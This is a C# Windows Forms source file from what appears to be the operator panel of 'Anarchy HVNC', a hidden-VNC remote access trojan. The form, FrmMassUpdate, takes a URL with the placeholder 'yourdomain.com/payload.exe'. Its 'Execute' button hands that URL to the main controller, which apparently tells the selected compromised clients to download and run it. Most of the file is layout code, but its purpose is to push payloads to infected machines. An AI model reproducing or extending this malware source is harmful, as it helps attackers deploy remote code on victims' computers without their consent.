using System;
using System.ComponentModel;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Siticone.UI.WinForms;

namespace Anarchy.HCS
{
    public class FrmMassUpdate : Form
    {
        public int count;

        private IContainer components;

        private Guna2Panel guna2Panel2;

        private SiticoneControlBox siticoneControlBox4;

        private SiticoneControlBox siticoneControlBox3;

        public Guna2TextBox Urlbox;

        private Guna2Button StartHiddenURLbtn;

        internal Label Label22;

        private Guna2Elipse guna2Elipse1;

        private Guna2DragControl guna2DragControl1;

        public FrmMassUpdate()
        {
            this.InitializeComponent();
        }

        private void StartHiddenURLbtn_Click(object sender, EventArgs e)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(this.Urlbox.Text))
                {
                    MessageBox.Show("URL is not valid!");
                    return;
                }
                FrmMain.MassURL = this.Urlbox.Text;
                FrmMain.ispressed = true;
                MessageBox.Show("Executed Successfully!", "Anarchy HVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                base.Close();
            }
            catch (Exception)
            {
                MessageBox.Show("An Error Has Occured When Trying To Update Selected Client(s)");
                base.Close();
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
            this.Label22 = new System.Windows.Forms.Label();
            this.siticoneControlBox4 = new Siticone.UI.WinForms.SiticoneControlBox();
            this.siticoneControlBox3 = new Siticone.UI.WinForms.SiticoneControlBox();
            this.Urlbox = new Guna.UI2.WinForms.Guna2TextBox();
            this.StartHiddenURLbtn = new Guna.UI2.WinForms.Guna2Button();
            this.guna2Elipse1 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
            this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.guna2Panel2.SuspendLayout();
            base.SuspendLayout();
            this.guna2Panel2.BackColor = System.Drawing.Color.Transparent;
            this.guna2Panel2.Controls.Add(this.Label22);
            this.guna2Panel2.Controls.Add(this.siticoneControlBox4);
            this.guna2Panel2.Controls.Add(this.siticoneControlBox3);
            this.guna2Panel2.CustomBorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
            this.guna2Panel2.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 1, 0);
            this.guna2Panel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.guna2Panel2.Location = new System.Drawing.Point(0, 0);
            this.guna2Panel2.Name = "guna2Panel2";
            this.guna2Panel2.ShadowDecoration.Color = System.Drawing.Color.White;
            this.guna2Panel2.ShadowDecoration.Depth = 15;
            this.guna2Panel2.ShadowDecoration.Parent = this.guna2Panel2;
            this.guna2Panel2.Size = new System.Drawing.Size(430, 41);
            this.guna2Panel2.TabIndex = 184;
            this.Label22.AutoSize = true;
            this.Label22.BackColor = System.Drawing.Color.Transparent;
            this.Label22.Font = new System.Drawing.Font("ProFont for Powerline", 15.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.Label22.ForeColor = System.Drawing.Color.White;
            this.Label22.Location = new System.Drawing.Point(12, 9);
            this.Label22.Name = "Label22";
            this.Label22.Size = new System.Drawing.Size(87, 21);
            this.Label22.TabIndex = 23;
            this.Label22.Text = "Anarchy";
            this.siticoneControlBox4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.siticoneControlBox4.BackColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox4.BorderRadius = 10;
            this.siticoneControlBox4.ControlBoxType = Siticone.UI.WinForms.Enums.ControlBoxType.MinimizeBox;
            this.siticoneControlBox4.FillColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox4.HoveredState.Parent = this.siticoneControlBox4;
            this.siticoneControlBox4.IconColor = System.Drawing.Color.White;
            this.siticoneControlBox4.Location = new System.Drawing.Point(331, 5);
            this.siticoneControlBox4.Name = "siticoneControlBox4";
            this.siticoneControlBox4.ShadowDecoration.Parent = this.siticoneControlBox4;
            this.siticoneControlBox4.Size = new System.Drawing.Size(45, 29);
            this.siticoneControlBox4.TabIndex = 21;
            this.siticoneControlBox3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.siticoneControlBox3.BackColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox3.BorderRadius = 10;
            this.siticoneControlBox3.FillColor = System.Drawing.Color.Transparent;
            this.siticoneControlBox3.HoveredState.Parent = this.siticoneControlBox3;
            this.siticoneControlBox3.IconColor = System.Drawing.Color.White;
            this.siticoneControlBox3.Location = new System.Drawing.Point(382, 5);
            this.siticoneControlBox3.Name = "siticoneControlBox3";
            this.siticoneControlBox3.PressedColor = System.Drawing.Color.DarkRed;
            this.siticoneControlBox3.ShadowDecoration.Parent = this.siticoneControlBox3;
            this.siticoneControlBox3.Size = new System.Drawing.Size(45, 29);
            this.siticoneControlBox3.TabIndex = 20;
            this.Urlbox.Animated = true;
            this.Urlbox.BackColor = System.Drawing.Color.Transparent;
            this.Urlbox.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
            this.Urlbox.BorderRadius = 5;
            this.Urlbox.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.Urlbox.DefaultText = "";
            this.Urlbox.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
            this.Urlbox.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
            this.Urlbox.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            this.Urlbox.DisabledState.Parent = this.Urlbox;
            this.Urlbox.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            this.Urlbox.FillColor = System.Drawing.Color.FromArgb(41, 46, 48);
            this.Urlbox.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
            this.Urlbox.FocusedState.Parent = this.Urlbox;
            this.Urlbox.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.Urlbox.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
            this.Urlbox.HoverState.Parent = this.Urlbox;
            this.Urlbox.Location = new System.Drawing.Point(12, 57);
            this.Urlbox.Name = "Urlbox";
            this.Urlbox.PasswordChar = '\0';
            this.Urlbox.PlaceholderText = "yourdomain.com/payload.exe";
            this.Urlbox.SelectedText = "";
            this.Urlbox.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
            this.Urlbox.ShadowDecoration.Depth = 10;
            this.Urlbox.ShadowDecoration.Enabled = true;
            this.Urlbox.ShadowDecoration.Parent = this.Urlbox;
            this.Urlbox.Size = new System.Drawing.Size(314, 23);
            this.Urlbox.TabIndex = 185;
            this.StartHiddenURLbtn.BorderRadius = 8;
            this.StartHiddenURLbtn.CheckedState.Parent = this.StartHiddenURLbtn;
            this.StartHiddenURLbtn.CustomImages.Parent = this.StartHiddenURLbtn;
            this.StartHiddenURLbtn.FillColor = System.Drawing.Color.FromArgb(255, 128, 0);
            this.StartHiddenURLbtn.Font = new System.Drawing.Font("Segoe UI", 9f);
            this.StartHiddenURLbtn.ForeColor = System.Drawing.Color.White;
            this.StartHiddenURLbtn.HoverState.Parent = this.StartHiddenURLbtn;
            this.StartHiddenURLbtn.Location = new System.Drawing.Point(332, 57);
            this.StartHiddenURLbtn.Name = "StartHiddenURLbtn";
            this.StartHiddenURLbtn.ShadowDecoration.Parent = this.StartHiddenURLbtn;
            this.StartHiddenURLbtn.Size = new System.Drawing.Size(86, 24);
            this.StartHiddenURLbtn.TabIndex = 190;
            this.StartHiddenURLbtn.Text = "Execute";
            this.StartHiddenURLbtn.Click += new System.EventHandler(StartHiddenURLbtn_Click);
            this.guna2Elipse1.BorderRadius = 10;
            this.guna2Elipse1.TargetControl = this;
            this.guna2DragControl1.TargetControl = this.guna2Panel2;
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            base.ClientSize = new System.Drawing.Size(430, 97);
            base.Controls.Add(this.StartHiddenURLbtn);
            base.Controls.Add(this.Urlbox);
            base.Controls.Add(this.guna2Panel2);
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            base.Name = "FrmMassUpdate";
            base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "FrmURL";
            this.guna2Panel2.ResumeLayout(false);
            this.guna2Panel2.PerformLayout();
            base.ResumeLayout(false);
        }
    }
}
